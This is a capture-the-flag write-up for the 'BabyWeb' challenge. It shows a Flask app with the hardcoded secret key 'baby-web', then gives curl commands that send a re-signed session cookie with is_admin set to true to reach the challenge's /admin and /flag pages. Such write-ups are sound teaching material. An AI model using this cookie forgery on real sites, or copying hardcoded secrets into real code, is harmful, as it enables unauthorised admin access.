---
title: BabyWeb Writeup
date: 2024-05-11
categories:
  - Writeups
tags:
  - Grey cat the flag
---

# 0x01

### Source code:

```python
import os
from flask import Flask, render_template, session

app = Flask(__name__)
app.secret_key = "baby-web"
FLAG = os.getenv("FLAG", r"grey{fake_flag}")


@app.route("/", methods=["GET"])
def index():
    # Set session if not found
    if "is_admin" not in session:
        session["is_admin"] = False
    return render_template("index.html")


@app.route("/admin")
def admin():
    # Check if the user is admin through cookies
    return render_template("admin.html", flag=FLAG, is_admin=session.get("is_admin"))

### Some other hidden code ###


if __name__ == "__main__":
    app.run(debug=True)
```

When we looked at the source code, we will find that this challenge has a secret_key of "baby-web" and we are able to get the flag by changing the cookie to get admin.

# 0x02
## Session

Session is to store information that is related to a user, across different requests(https://testdriven.io/blog/flask-sessions/)

In python, a secret key will be used to securely sign session cookies. This safety feature is to prevent tampering and unauthorised access to user's data

At here, we can see that the secret_key is "baby-web",
what we can do is to use a decoder tool to get the exact content of the cookie by using the secret_key

```json
{'is_admin': False}
```

By using the decoder we can see that the decoded content is '{'is_admin': False}'

What we need to do is to change it into '{'is_admin': True}', encoding it and use that as the cookie

```bash
curl -s "http://challs.nusgreyhats.org:33338/admin" -H "Cookie: session=eyJpc19hZG1pbiI6dHJ1ZX0.ZiZZgQ.1kYTfvAiwehvaSp4vdgOJ5clRM0"
```

# 0x03

After sending the request, from the response

```html
  <button hx-get="/flag" hx-swap="outerHTML" class="btn btn-secondary">Here is an even more secret button.</button>            
```

We still need to access "/flag" to get the flag

```bash
curl -s "http://challs.nusgreyhats.org:33338/flag" -H "Cookie: session=eyJpc19hZG1pbiI6dHJ1ZX0.ZiZZgQ.1kYTfvAiwehvaSp4vdgOJ5clRM0"
```

By using this, we are able to get the flag
